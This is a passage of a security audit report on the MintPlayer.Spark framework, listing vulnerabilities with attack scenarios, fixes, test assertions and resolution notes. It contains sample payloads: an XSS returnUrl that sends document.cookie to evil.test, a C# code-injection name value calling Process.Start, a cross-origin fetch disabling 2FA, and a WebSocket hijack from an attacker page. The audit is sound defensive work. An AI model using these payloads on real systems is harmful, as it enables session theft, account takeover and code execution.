**Resolution (`feat/security-audit-round-2`):** mTLS gate added — `EtlDeploy.HandleAsync` calls `IModuleCertificateValidator.ValidateAsync(RequestingModule)` before `EtlTaskManager.DeployAsync`. Production mode requires a client cert whose SHA-256 thumbprint matches the module's pinned value (missing cert → 401; unknown module / thumbprint mismatch → 403); Development mode still requires the module be registered (empty/unknown → 403). Verified by E2E `ReplicationEndpointAuthTests.Unauth_post_etl_deploy_with_unknown_requesting_module_is_refused` and in-process `EtlDeployEndpointTests` (body-validation + 401/403 gate branches).

---

##### R2-C2 — Unauthenticated `/spark/sync/apply` enables arbitrary CRUD on any RavenDB collection

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed (independently flagged by two agents)

**Where:** `MintPlayer.Spark.Replication/Endpoints/SyncApply.cs:8-124`, dispatch at `MintPlayer.Spark/Services/SyncActionHandler.cs:31-64`

**Attack scenario:** Endpoint accepts a list of `SyncAction { Collection, DocumentId, Data, ActionType }` with **no auth and no antiforgery**, and dispatches each to `ISyncActionHandler.HandleSave/DeleteAsync`. The sync handler resolves the CLR type from the attacker-controlled `Collection` string and routes through the Actions pipeline — bypassing `IPermissionService.EnsureAuthorizedAsync` entirely (only `DatabaseAccess.SavePersistentObjectAsync` checks permissions; this path goes around it). An attacker mass-deletes or overwrites any document — including identity tables (`SparkUsers`, `OidcApplications`). Per-action error responses also echo `ex.Message` (`SyncApply.cs:108`) — M-6 regression.

**Expected secure behavior:** Authenticate the calling module (the design intent — `RequestingModule` exists but is unvalidated); restrict `Collection` to the set this module owns via `[Replicated(SourceModule="me")]`; refuse cross-module writes; require antiforgery if cookie-auth is the chosen scheme.

**Test asserts:** Unauthenticated `POST /spark/sync/apply` returns 401; a Delete against an un-replicated collection returns 403; partial-success body does not contain `ex.Message`.

**Resolution (`feat/security-audit-round-2`):** Same mTLS gate via `IModuleCertificateValidator` runs before dispatch in `SyncApply.HandleAsync` (missing cert → 401; empty/unknown module → 403). This round also fixed a latent bug that *masked* the gate: the body's `ActionType` enum didn't bind from its JSON string form (`"Delete"`), so `ReadFromJsonAsync` threw and returned **400 before** the module check ever ran — `[JsonConverter(typeof(JsonStringEnumConverter<SyncActionType>))]` now accepts both string and numeric forms. Verified by E2E `ReplicationEndpointAuthTests` (unknown + empty `RequestingModule`) and in-process `SyncApplyEndpointTests` (400/401/403/500/200/207 matrix, incl. a string-enum binding regression). Still open: the per-action `Error = ex.Message` leak (`SyncApply.cs`) flagged here under M-6 is not yet addressed, and `Collection`-ownership enforcement remains a follow-up.

---

##### R2-C3 — Webhook signature verification fails open on empty secret and is not timing-safe

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark.Webhooks.GitHub/Services/SignatureService.cs:11-26`, demo defaults at `Demo/WebhooksDemo/WebhooksDemo/appsettings.json:16` (`"WebhookSecret": ""`)

**Attack scenario:** Two distinct flaws compound. (a) Lines 13-14: when `WebhookSecret` is empty (default in the demo as shipped), the method returns `true` for **any** signature — including `null` — so an unauthenticated POST to `/api/github/webhooks` is accepted as a valid GitHub event. `MessageBus.BroadcastAsync` then runs every registered `IRecipient` with attacker-supplied payloads (e.g., `DeleteBranchOnPullRequestClose` deletes branches on attacker-named repos using the real installation token). (b) Line 25: `string.Equals(signature, expectedHeader, StringComparison.Ordinal)` short-circuits on first byte-mismatch, leaking timing that lets a remote attacker recover a valid HMAC byte-by-byte. `CryptographicOperations.FixedTimeEquals` is unused anywhere in the repo.

**Expected secure behavior:** Missing/empty secret must fail-closed (reject all webhooks, log warning). Comparison must use `CryptographicOperations.FixedTimeEquals` on byte arrays of equal length.

**Test asserts:** `VerifySignature(null, "", "body")` returns `false`; signature comparison routes through `FixedTimeEquals` (asserted via a mockable seam).

---

##### R2-C4 — XSS + open-redirect on `/spark/auth/external-login-callback` (`returnUrl` reflected into HTML/JS)

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark.Authorization/Extensions/SparkAuthenticationExtensions.cs:144-159`

**Attack scenario:** Handler interpolates `returnUrl` (just `returnUrl ?? "/"`, despite the misleading `safeReturnUrl` variable name) directly into a JavaScript string literal: `window.location.href = '{{safeReturnUrl}}';`. No encoding, no scheme validation, no local-only check. After OAuth, the page is served from the app's origin — a phished URL `?returnUrl=';location.href='https://evil.test/?c='%2Bdocument.cookie;//` executes attacker JS inside the app's origin, leaking the (non-HttpOnly-by-design) `XSRF-TOKEN` cookie and any same-origin reachable state.

**Expected secure behavior:** Validate `returnUrl` starts with a single `/` and is not `//` or `\\…`; reject anything else and substitute `defaultRedirectUrl`. Prefer server-side `Results.Redirect` over building HTML; if HTML is needed for popup flows, HTML-encode the value AND embed it as a `data-*` attribute the script reads, never as a JS literal.

**Test asserts:** `GET /spark/auth/external-login-callback?returnUrl=';alert(1);//` returns a body whose script tag does not contain unencoded `'`/`<`; final navigation lands on `defaultRedirectUrl`.

---

##### R2-C5 — Source generator emits identifier slots from `App_Data/Model/*.json` without validation (build-time RCE)

**Layer:** Framework (build-time) · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark.SourceGenerators/Generators/PersistentObjectNamesGenerator.IdsProducer.cs:77,86`, JSON reader at `MintPlayer.Spark.SourceGenerators/Json/ModelJsonReader.cs:43-58`

**Attack scenario:** `PersistentObjectIdsProducer` interpolates `schema.Key` (line 77) and `entry.Name` (line 86) directly as C# identifiers in the emitted source. Only `entry.Id` is `Guid.TryParse`-validated. A contributor (or a templating tool) who can land content in `App_Data/Model/*.json` plants `"name": "Foo; } public static class Pwn { static Pwn(){ System.Diagnostics.Process.Start(...); } public static class Bar"`. At the next `dotnet build`, the generator compiles attacker C# into the host project; the static constructor fires on first reference (test run, app boot).

Upgrades the round-1 L-6 note: round 1 dismissed source-generator identifier shape as "not runtime-exploitable", but the identifiers sourced from `AdditionalFiles` (untrusted) flip the threat model. Untrusted-input emission paths in `LibraryTranslationsProducer.BuildCSharpStringLiteral` and `HostTranslationsAggregatorProducer.Literal` are properly escaped — verified clean.

**Expected secure behavior:** Validate `Name`/`Schema` with `SyntaxFacts.IsValidIdentifier` (or the regex `^[A-Za-z_][A-Za-z0-9_]*$`) before emission; emit a diagnostic and skip the entry on mismatch. Centralize identifier emission in a `WriteIdentifier(string)` helper used by every `*.Producer.cs`.

**Test asserts:** Run the generator over a Model JSON whose `persistentObject.name` is `"Foo; class X {"` — the emitted source either omits the entry or contains a `#error` diagnostic, and `Roslyn` reports no introduced types from the payload.

---

#### HIGH

---

##### R2-H1 — `IPermissionService` fails open when `AddAuthorization()` is not wired (round-1 H-4 unaddressed)

**Layer:** Framework · **Testable?** Indirect · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/Services/PermissionService.cs:11-28` — both `EnsureAuthorizedAsync` and `IsAllowedAsync` short-circuit `return` / `return true` when `accessControl is null`. `DemoApp/Program.cs` ships exactly this configuration (`AddSpark` without `spark.AddAuthorization()`).

**Attack scenario:** Every CRUD endpoint, custom action, custom query, metadata filter (H-1 per-caller filter at `Endpoints/EntityTypes/List.cs:22`), and `/spark/permissions/{id}` evaluation returns "allowed" without an `IAccessControl`. The system is open with no startup error. **This silently nullifies every H-1, H-2, H-3 round-1 fix on hosts without the auth package** — those fixes call into `IPermissionService`, which no-ops.

**Expected secure behavior:** Either fail at host build when `IAccessControl` isn't registered alongside `IPermissionService`, or ship a fail-closed `NullAccessControl` default that returns `false` for authenticated checks and only allows anonymous on opted-in endpoints. Source-generated `AddSparkFull` already chains in auth (per `SparkFullGenerator.Producer.cs:92-93`) — apply the same gate to the bare `AddSpark` path.

**Test asserts:** A `WebApplication` built with `AddSpark` only — no `AddAuthorization` — either throws at `Build()` or rejects `GET /spark/po/{anyType}` with 401/403.

---

##### R2-H2 — Row-level authorization hook not invoked on Edit/Delete writes (round-1 H-2 partial fix)

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/Services/DatabaseAccess.cs:190-241` (`SavePersistentObjectAsync` calls only entity-type-level `EnsureAuthorizedAsync` on line 196), `:243-263` (`DeletePersistentObjectAsync` same shape on line 248). `IsAllowedEntityViaActionsAsync` is invoked only from the Read/Query paths at `:100` and `:184`.

**Attack scenario:** PR #123's row-level hook (`DefaultPersistentObjectActions<T>.IsAllowedAsync(action, entity)`) defends Read and Query. Update loads the entity via `GetPersistentObjectAsync` (so Read passes), then `SavePersistentObjectAsync` is called — never consulting the actions-level row gate for `Edit`. Same for Delete. An app that wants "read-everyone, edit-owner-only" has no way to express it; the hook isn't reached. If Alice can see Bob's record, Alice can also overwrite or delete it (subject to entity-type-level Edit/Delete rights).

**Expected secure behavior:** Call `IsAllowedEntityViaActionsAsync(entityType, "Edit", entity)` inside `SavePersistentObjectAsync` after loading the existing entity for the concurrency check, and `..."Delete"...` inside `DeletePersistentObjectAsync`. Return 404 on denial for consistency with M-3.

**Test asserts:** With an Actions class returning `IsAllowedAsync("Edit", entity) = false` for caller B on A's record, B's `PUT /spark/po/{type}/{A-id}` returns 404 and the document is unchanged.

---

##### R2-H3 — Identity API (`/spark/auth/*`) accepts cross-origin POSTs (no antiforgery on 2FA/password/email changes)

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark.Authorization/Extensions/SparkAuthenticationExtensions.cs:72` (`authGroup.MapIdentityApi<TUser>()`); `MintPlayer.Spark/SparkMiddleware.cs:166-186` (CSRF middleware is metadata-gated on `IAntiforgeryMetadata`).

**Attack scenario:** Microsoft's `MapIdentityApi` doesn't attach `IAntiforgeryMetadata` to its endpoints. The Spark CSRF middleware enforces only when metadata sets `RequiresValidation = true`, so `/spark/auth/login`, `/register`, `/forgotPassword`, `/resetPassword`, `/manage/info` (POST), `/manage/2fa` (POST) accept cross-origin JSON. A malicious page coerces the authenticated victim's browser into POSTing `{"enable":false}` to `/spark/auth/manage/2fa` (or rotating the email used for password reset). Logout *is* protected — `MintPlayer.Spark.Authorization/Endpoints/Logout.cs:14` — but the rest are not.

**Expected secure behavior:** Either attach `RequireAntiforgeryToken(true)` metadata to every Identity-API endpoint after `MapIdentityApi`, or require bearer-token auth on the Identity API surface and disable cookie auth for that group.

**Test asserts:** Cross-origin `fetch('/spark/auth/manage/2fa', { method: 'POST', credentials: 'include', body: '{"enable":false}' })` returns 400/401 (without `X-XSRF-TOKEN`), not 200.

---

##### R2-H4 — LookupReference mutation endpoints have no authentication

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/Endpoints/LookupReferences/{AddValue,UpdateValue,DeleteValue}.cs` — antiforgery is set, but no `IPermissionService.EnsureAuthorizedAsync` call here or in `MintPlayer.Spark/Services/LookupReferenceService.cs:123-220`. Round-1 §2 marked these "Yes*" — that was incorrect.

**Attack scenario:** Any caller (anonymous, or low-privilege authenticated) can POST/PUT/DELETE entries on LookupReference dictionaries (CarStatus, CompanyTier, etc.). These power business-logic decisions and reference rendering across the app; wholesale rewrite is a privilege escalation that doesn't touch the entity-level permission model at all.

**Expected secure behavior:** Require authentication AND a configurable permission (e.g., admin-only by default, or `"Edit"` on a virtual `LookupReference` resource).

**Test asserts:** Authenticated low-privilege user `POST /spark/lookupref/CarStatus` returns 403; anonymous `DELETE /spark/lookupref/X/Y` returns 401.

---

##### R2-H5 — WebSocket streaming has no `Origin` validation (cross-site WebSocket hijacking)

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/SparkMiddleware.cs:193` (`app.UseWebSockets()` with default options; `AllowedOrigins` unset), `MintPlayer.Spark/Endpoints/Queries/StreamExecuteQuery.cs:45`

**Attack scenario:** ASP.NET Core enforces same-origin on WebSocket upgrades only when `AllowedOrigins` is populated; with defaults, any origin can initiate the upgrade. `StreamExecuteQuery` authenticates inside the upgrade based on ambient cookies, so an attacker page `https://evil/` opens `new WebSocket('wss://victim/spark/queries/{id}/stream')` and the victim's session cookie is sent automatically. The attacker reads the entire streamed result set. Antiforgery doesn't apply to WS upgrades.

**Expected secure behavior:** Populate `WebSocketOptions.AllowedOrigins` from the app's allowed-hosts/CORS config, or explicitly check `Request.Headers["Origin"]` in `StreamExecuteQuery` before `AcceptWebSocketAsync`.

**Test asserts:** WS upgrade carrying `Origin: https://attacker.test` and a valid session cookie is rejected with 403 before any data flows.

**Resolution (`feat/security-audit-round-2`):** Implemented as a same-origin guard middleware in `UseSpark` (`SparkMiddleware.cs`) rather than inside `StreamExecuteQuery`: a WebSocket upgrade whose `Origin` host doesn't match the request host is rejected with 403; requests with no `Origin` (non-browser clients) pass through. This round also caught that the guard was **dead code** — it had been registered *before* `app.UseWebSockets()`, so `context.WebSockets.IsWebSocketRequest` was always false and the check never fired (the foreign-origin test had been passing only incidentally, because its target query wasn't streamable and 400'd at the endpoint). Fixed by moving `UseWebSockets()` ahead of the guard. Verified by E2E `WebSocketOriginTests` (foreign `Origin` → handshake rejected; no `Origin` → accepted via a new `StreamCompanies` streaming query on Company, which Everyone may read).

---

##### R2-H6 — Polymorphic message deserialization via `Type.GetType` on database-controlled string

**Layer:** Framework · **Testable?** Yes · **Confidence:** Likely

**Where:** `MintPlayer.Spark.Messaging/Services/MessageSubscriptionWorker.cs:67,129`, `MessageBus.cs:43` (writes `AssemblyQualifiedName`)

**Attack scenario:** The worker resolves `sparkMessage.MessageType` (assembly-qualified) via `Type.GetType` then `JsonConvert.DeserializeObject(payload, clrType)`. Names live in the `SparkMessages` collection; anyone with write access to that collection — including via R2-C2 (`/spark/sync/apply`, unauthenticated) — crafts a message whose `MessageType` is a Newtonsoft.Json deserialization-gadget type (`ObjectDataProvider` etc.) with payload encoding RCE. Combined with R2-C2 this is RCE on the message-consuming process.

**Expected secure behavior:** Resolve `MessageType` via an allow-list (the set of types registered as `IRecipient<T>`); reject unknown to dead-letter. Same for `HandlerType`.

**Test asserts:** A SparkMessage whose `MessageType` is not registered as `IRecipient<T>` is dead-lettered without `Type.GetType` succeeding.

---

##### R2-H7 — Module URL trust-on-first-claim enables ETL/sync hijack via SparkModules write

**Layer:** Framework · **Testable?** Indirect · **Confidence:** Likely

**Where:** `MintPlayer.Spark.Replication/Services/ModuleRegistrationService.cs:25-87`, `Messages/EtlScriptDeploymentRecipient.cs:47-65`, `Workers/SyncActionSubscriptionWorker.cs:123-138`

**Attack scenario:** PR #148's "re-resolve source URL per delivery" fix is correct in isolation, but resolves against the shared RavenDB `SparkModules` database (default URL `http://localhost:8080`, unauthenticated in the demo per R2-L1) where *any* connected module overwrites `moduleInformations/{ModuleName}` on every startup. A malicious module starting up with `ModuleName="HR"` immediately rotates HR's `AppUrl` to its own URL; the very next ETL/sync delivery is POSTed to the attacker with the source module's data + the requester's RavenDB connection string (a credential leak).

**Expected secure behavior:** (a) Require a deployment-time shared secret per module so registration is signed; or (b) pin `moduleInformations/{Name}` to its first-registered owner key (no overwrite); or (c) operator-curated registration documents (modules update — never create — their own entry).

**Test asserts:** `RegisterAsync` against a SparkModules store that already contains `moduleInformations/X` registered with a different fingerprint refuses to overwrite.

---

##### R2-H8 — `IsReadOnly` / `IsVisible` attribute flags not enforced on write (L-7a/L-7b)

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/Services/EntityMapper.cs:437-479` (`PopulateObjectValuesAsync`/`PopulateObjectValues` iterate every PO attribute, write to the matching CLR property without consulting `attribute.IsReadOnly` or `attribute.IsVisible`).

**Attack scenario:** Round-1 L-7a/L-7b. The disposition table marked these "Address", the test-results doc walked them back to "deferred". The code shows neither write-gate exists. A PUT with `CreatedBy` (`IsReadOnly=true`) or `Role` (`IsVisible=false`) overwrites the field. Severity bumped from Low to High in round 2 because they pair with R2-H1 / R2-C2 — an unauthenticated `/spark/sync/apply` POST can set fields that the *schema* declared off-limits.

**Expected secure behavior:** In `PopulateObjectValuesAsync`, skip attributes with `IsReadOnly=true` (unless explicit admin override) and attributes the current principal cannot see per H-1b.

**Test asserts:** PUT changing an `IsReadOnly=true` field — reload shows server-side value unchanged.

---

##### R2-H9 — `returnUrl` validator never landed on Angular login / two-factor (round-1 H-5 regression)

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `node_packages/ng-spark-auth/login/src/spark-login.component.ts:51-52`, `two-factor/src/spark-two-factor.component.ts:63-64`. No `allowedReturnUrls` field on `models/src/auth-config.ts`, no validator function, no `startsWith('/') && !startsWith('//')` guard.

**Attack scenario:** Round-1 H-5 disposition specified configurable `allowedReturnUrls` plus reject-not-local validation. Master ships neither — `router.navigateByUrl(returnUrl)` runs unchanged. Angular's `navigateByUrl` rejects *some* external shapes (`https://attacker`) but not all (`//attacker.test/path`, `/login/../..//attacker`). The framework-side equivalent in `external-login-callback` is much worse (see R2-C4); the client-side path remains a defense-in-depth gap.

**Expected secure behavior:** Implement the disposition: a shared `isReturnUrlSafe(url, allowedReturnUrls)` helper used by `login`, `two-factor`, `register`, and the auth interceptor.

**Test asserts:** Playwright — `/login?returnUrl=//attacker.test` followed by successful login lands on `defaultRedirectUrl`, not on `attacker.test`.

---

##### R2-H10 — Cross-reference breadcrumb resolver bypasses row-level Read authorization

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark/Services/ReferenceResolver.cs:97-140`, `MintPlayer.Spark/Services/DatabaseAccess.cs:104-109,148-151`

**Attack scenario:** After H-2 row-filtering keeps an entity visible (`Order { CreatedBy: "users/alice" }`), `ResolveReferencedDocumentsAsync` calls `session.LoadAsync<User>("users/alice")` and embeds the loaded user as a breadcrumb. The Actions class's row-gate runs on the primary entity only; the referenced `User` is loaded without consulting the caller's per-row Read permission. Bob sees Alice's display name / email by listing Orders that reference Alice.

**Expected secure behavior:** Cross-collection reference resolution must call `IsAllowedEntityViaActionsAsync(targetType, "Read", refDoc)` before exposing the breadcrumb. Or limit breadcrumbs to a developer-declared safe subset.

**Test asserts:** With seeded Alice (private) and Bob-owned record referencing Alice — Bob's list shows the record, but the Alice breadcrumb is null/omitted.

---

##### R2-H11 — External-login auto-creates user from unverified provider email

**Layer:** Framework · **Testable?** Indirect · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark.Authorization/Extensions/SparkAuthenticationExtensions.cs:111-128`, `Extensions/GitHubAuthenticationExtensions.cs:36-37`

**Attack scenario:** On first external login the handler grabs `ClaimTypes.Email` from the OAuth principal and creates a new `TUser` with that email — no `EmailConfirmed=true` flag, no `email_verified` claim check. GitHub returns whatever the user has set as primary; the `verified:true` flag on `/user/emails` is never consulted. Google/Microsoft `email_verified` similarly ignored. If the app later keys any decision off `Email` (and the round-1 audit found H-1b that schema flags ARE caller-evaluated), an attacker who can claim any email at an external IdP impersonates that identity.

**Expected secure behavior:** Require `email_verified=true` (Google/Microsoft/Apple) or fetch `/user/emails?primary&verified` (GitHub) before auto-provisioning. Set `EmailConfirmed=true` only when the issuer attests.

**Test asserts:** With a mocked OAuth principal lacking `email_verified=true`, the callback either redirects to a "please verify" route or refuses to bind the email.

---

##### R2-H12 — Dev WebSocket auth-bypass via empty `AllowedDevUsers`

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark.Webhooks.GitHub/Extensions/SparkBuilderExtensions.cs:65-110`, `Configuration/GitHubWebhooksOptions.cs:28-32`

**Attack scenario:** Handshake validates the GitHub token by calling `githubClient.User.Current()`. The gate is `AllowedDevUsers.Count > 0 && !AllowedDevUsers.Contains(login)` — i.e., **empty `AllowedDevUsers` accepts every authenticated GitHub user**. Any GitHub user (including throwaway accounts) subscribes to the dev webhook stream and reads every webhook delivered for `DevelopmentAppId` — private-repo data, branch refs, issue contents.

**Expected secure behavior:** Empty `AllowedDevUsers` rejects all connections, OR add an explicit `AllowAnyAuthenticatedGitHubUser=true` opt-in.

**Test asserts:** With `AllowedDevUsers = []`, a connection presenting a valid-but-unlisted token receives `Status401Unauthorized`.

---

##### R2-H13 — Unbounded WebSocket message read enables memory-exhaustion DoS

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Dotnet.SocketExtensions/SocketExtensions.cs:10-32`, used by `SparkBuilderExtensions.cs:82` (`ws.ReadObject<Handshake>()`) on the unauthenticated `/spark/github/dev-ws` endpoint

**Attack scenario:** `ReadMessage` loops `ReceiveAsync` into a `MemoryStream` until `EndOfMessage`, no max-bytes cap. Attacker opens a WebSocket and sends a single multi-frame message of arbitrary size; the server allocates that much memory before deciding whether the GitHub token is valid. A handful of parallel connections OOMs the process.

**Expected secure behavior:** Cap the accumulator (e.g., 64 KiB for handshakes, 1 MiB for webhook bodies); close the socket with `MessageTooBig` once exceeded.

**Test asserts:** `ReadMessage` against a mock WebSocket streaming 100 MB throws/closes before exhausting memory.

---

##### R2-H14 — RQL injection in `MessageSubscriptionWorker` subscription query

**Layer:** Framework · **Testable?** Yes · **Confidence:** Likely

**Where:** `MintPlayer.Spark.Messaging/Services/MessageSubscriptionWorker.cs:40-51`

**Attack scenario:** `EscapeRql` only escapes `'`. `queueName` flows from `MessageQueueAttribute.QueueName` (developer-controlled) **and** from `IMessageBus.BroadcastAsync<T>(message, queueName, ct)` (`MessageBus.cs:21`) — any caller that takes the name from user input creates RQL injection. The escape is also bypassable: `\` itself is not escaped, so `\\'` → `\\\'` still closes the literal.

**Expected secure behavior:** Parameterize the subscription RQL, or validate `queueName` against `[a-zA-Z0-9._-]+` before composition.

**Test asserts:** A queue name containing `\` is rejected (or the override path enforces the allow-list).

---

##### R2-H15 — `SyncActionHandler._collectionTypeCache` grows unbounded on attacker input

**Layer:** Framework · **Testable?** Yes · **Confidence:** Likely

**Where:** `MintPlayer.Spark/Services/SyncActionHandler.cs:29,192` (`ConcurrentDictionary<string,Type?>` keyed on attacker-supplied `collection`; caches `null` for misses)

**Attack scenario:** Combined with R2-C2 (unauthenticated `/spark/sync/apply`), an attacker hammers the endpoint with random `Collection` strings; each generates a `null` cache entry. Memory grows without bound. The generic `ReflectionCache` primitive is correctly designed; this single consumer breaks the contract by caching unbounded request input.

**Expected secure behavior:** Bound the cache to `modelLoader.GetEntityTypes()`; do not cache unresolved misses; OR fix R2-C2 first so the attacker can't fill it.

**Test asserts:** 10K POSTs with unique random `Collection` strings — cache size stays bounded by the schema collection set.

---

##### R2-H16 — Third-party GitHub Actions not pinned to commit SHAs

**Layer:** CI · **Testable?** Yes · **Confidence:** Confirmed

**Where:**
- `.github/workflows/dotnet-build-master.yml:150,159,168,177` — `JS-DevTools/npm-publish@v4` with `secrets.PUBLISH_TO_NPMJS` (npm publish token)
- `.github/workflows/webhooks-demo-deploy.yml:114` — `appleboy/ssh-action@v1.0.0` with `VPS_SSH_KEY` (root on prod VPS)
- `.github/workflows/pull-request.yml:24` — `nrwl/nx-set-shas@v4` on every PR including forks

**Attack scenario:** GitHub action tags (`@v4`, `@v1.0.0`) are mutable. Compromise of the action's repo or maintainer account lets the attacker retag a backdoored commit. On the next master build, malicious code runs with secrets in scope: npm publish token (poisoned `@mintplayer/ng-spark` release), VPS SSH key (root on prod), GHCR push.

**Expected secure behavior:** Pin third-party actions to a 40-char commit SHA (`uses: appleboy/ssh-action@<sha>  # v1.0.0`). Dependabot can update them.

**Test asserts:** Lint job (`zizmor` / `pinact --check`) fails CI if any non-`actions/*` use ref isn't a 40-char hex SHA.

---

##### R2-H17 — VPS deploy pulls `docker-compose.yml` from master at runtime

**Layer:** Deployment · **Testable?** Indirect · **Confidence:** Confirmed

**Where:** `.github/workflows/webhooks-demo-deploy.yml:128-131`

**Attack scenario:** Deploy step `curl`s `raw.githubusercontent.com/.../master/Demo/WebhooksDemo/docker-compose.yml`, deletes the old file, writes the new. Any push to master changes deployment semantics with no verification. No SHA pin, no checksum, no signed attestation on the compose file.

**Expected secure behavior:** Either bake `docker-compose.yml` into the image (so it ships with build attestations) or check it out by `github.sha` from the same workflow with `curl --fail` + checksum verification.

**Test asserts:** Deploy fails if the fetched compose file's sha256 doesn't match the digest emitted by the build step.

---

##### R2-H18 — PR workflow has no `permissions:` block (inherits repo default token)

**Layer:** CI · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `.github/workflows/pull-request.yml:1-15`

**Attack scenario:** Without an explicit `permissions:` block, the workflow inherits the repo's default `GITHUB_TOKEN` scope. If the repo default is permissive, a malicious PR script step (compromised third-party action, future-added `postinstall`) pushes commits or opens issues. The other two workflows already declare per-job permissions — the PR workflow should match.

**Expected secure behavior:** Add `permissions: { contents: read }` at workflow level (override per-job if specific jobs need more).

**Test asserts:** `pull-request.yml` contains `permissions:` with `contents: read` and no `write` scopes.

---

##### R2-H19 — Client-operation envelope dispatches server-driven side effects with no per-operation policy

**Layer:** Framework · **Testable?** Likely · **Confidence:** Likely

**Where:** `node_packages/ng-spark/services/src/spark.service.ts:195-209` (`sendWithEnvelope` dispatches `envelope.operations` from every Create/Update/Delete/Execute response and from 449 error bodies), `node_packages/ng-spark/client-operations/src/dispatcher.service.ts:27-36`, `client-operations/src/provide.ts:17-30`, `client-operations/src/operations.ts:15-52` (declares `navigate`, `refreshAttribute`, `disableAction` types)

**Attack scenario:** Toast text is correctly interpolated (escaped), but the envelope's design treats the *content* of each operation as fully trusted. As more powerful operations land (`navigate` already exists in the type system), a single attribute-echo XSS, or a single mid-channel byte flip on a non-TLS path, lets an attacker drive client-side navigation, query refresh, etc. The dispatcher is correctly allow-listed by handler type — what's missing is content-level policy (e.g., `navigate` URLs must be same-origin / app-internal).

**Expected secure behavior:** When `navigate` handler ships, validate the target is in-app exactly as `returnUrl` should be (shared validator with R2-H9 / R2-C4). Cap `notify.message` length. Document the trust contract for handler authors.

**Test asserts:** A `navigate` operation with `routeName: '//attacker.test'` does not change the route.

---

#### MEDIUM

---

##### R2-M1 — `M-6` regressed: exception `.Message` echoed across five endpoints

**Where:**
- `MintPlayer.Spark/Endpoints/Actions/ExecuteCustomAction.cs:93` (500 body)
- `MintPlayer.Spark/Endpoints/Queries/StreamExecuteQuery.cs:91,115` (over WebSocket + close reason)
- `MintPlayer.Spark/Endpoints/LookupReferences/{AddValue,UpdateValue,DeleteValue}.cs` (`ex.Message` → 400 body)
- `MintPlayer.Spark/Endpoints/PersistentObject/Update.cs:75` (`SparkConcurrencyException.Message` → 409 body — leaks server change vector)
- `MintPlayer.Spark.Replication/Endpoints/SyncApply.cs:108` (per-action 207 body)

Disposition table marked round-1 M-6 "Address"; the TestResults walked back to "already secure" — but multiple paths still echo internals. Fix: generic message + correlation ID; for 409, omit the server-side change vector.

---

##### R2-M2 — Unbounded `take` on Query Execute (post-materialization paging)

**Where:** `MintPlayer.Spark/Endpoints/Queries/Execute.cs:82-86`, `MintPlayer.Spark/Services/QueryExecutor.cs:30-71,168`

`take=2147483647` is accepted with no upper bound; `ExecuteDatabaseQueryAsync` materializes the entire result set before applying `Skip(skip).Take(take)` in memory. Search filter and projection also run on the full materialized list. Authenticated `Query/{type}` caller pins CPU/memory.

Fix: clamp `take` to a configurable max (e.g., 1000) AND push `Skip`/`Take` down to RavenDB.

**Resolution (`feat/security-audit-round-2`):** `take` is clamped to `[1, 1000]` and `skip` floored at 0 in `Execute.cs` via `Math.Clamp`; out-of-range values are normalized rather than 500'd. Verified by E2E `QueryDosTests` (astronomical `take` returns 200 quickly; negative/zero skip+take normalized) — repointed to the GetCompanies query (`…440003`, granted to Everyone) since the previous id resolved to GetPeople/Person, which anonymous callers can't query. The RavenDB-side push-down of `Skip`/`Take` noted above remains a separate optimization.

---

##### R2-M3 — External-login *challenge* doesn't validate `returnUrl` is local

**Where:** `MintPlayer.Spark.Authorization/Extensions/SparkAuthenticationExtensions.cs:78-87`

Even after R2-C4 is fixed, accepting `returnUrl=https://evil.test` at the entry point lets an attacker chain through OAuth to reflect any state they control. Reject `returnUrl` unless it's relative.

---

##### R2-M4 — Streaming auth gate is one-shot; revoked permissions keep streaming

**Where:** `MintPlayer.Spark/Streaming/StreamingQueryExecutor.cs:50`, `Endpoints/Queries/StreamExecuteQuery.cs:51-66`

Single `EnsureAuthorizedAsync` at upgrade; the `await foreach` loops forever even after group membership changes, session revoked, user deleted, or row-level policy tightens. Periodic re-evaluation (or per-batch) with a recognized close code on policy change.

---

##### R2-M5 — `/spark/sync/apply` and `/spark/etl/deploy` have no antiforgery on POST (CSRF surface even after auth lands)

**Where:** `MintPlayer.Spark.Replication/Endpoints/{SyncApply,EtlDeploy}.cs` — no `RequireAntiforgeryTokenAttribute` in either.

Once R2-C1/R2-C2 add cookie auth, CSRF is exploitable. Add `RequireAntiforgeryToken(true)` metadata or require a Bearer header for these endpoints exclusively.

---

##### R2-M6 — Webhook delivery has no replay protection

**Where:** `MintPlayer.Spark.Webhooks.GitHub/Services/SparkWebhookEventProcessor.cs:35-80`

No `X-GitHub-Delivery` dedup, no timestamp window. A captured signed body can be replayed indefinitely. Track delivery IDs for ~24 h (Raven doc with TTL or in-memory LRU); reject duplicates.

---

##### R2-M7 — Dev-tunnel paths bypass Octokit's signature gate by re-minifying JSON

**Where:** `MintPlayer.Spark.Webhooks.GitHub.DevTunnel/Services/SmeeBackgroundService.cs:57-58`, `WebSocketDevClientService.cs:80-82`

DevTunnel paths invoke `ProcessWebhookAsync` directly and re-serialize the JSON before signing — different bytes from GitHub's signed original → verification fails on benign deliveries → operators disable the secret. Preserve raw bytes byte-for-byte; document this is the load-bearing signature checkpoint.

---

##### R2-M8 — `DevWebSocketService._clients` mutated without synchronization

**Where:** `MintPlayer.Spark.Webhooks.GitHub/Services/DevWebSocketService.cs:6-36`

Bare `List<SocketClient>` `.Add`/`.Remove` from concurrent handler invocations. Use `ConcurrentBag<SocketClient>` or `lock` around mutations.

---

